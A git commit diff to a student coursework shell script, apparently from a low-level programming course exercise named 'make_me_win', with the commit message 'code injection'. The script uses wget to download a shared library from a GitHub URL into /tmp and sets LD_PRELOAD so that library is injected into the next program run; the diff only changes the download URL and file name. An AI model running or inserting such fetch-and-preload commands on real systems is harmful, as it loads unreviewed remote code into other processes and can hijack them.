588274ee295f8b587722653957364cfd9d02c4e3
ngatia-nancy <nancyngatia1@gmail.com>
2022-12-17 12:00:27 -0800

    code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
-export LD_PRELOAD=/tmp/hacked.so
+wget -P /tmp https://github.com/ngatia-nancy/alx-low_level_programming/raw/main/0x18-dynamic_libraries/test.so
+export LD_PRELOAD=/tmp/test.so
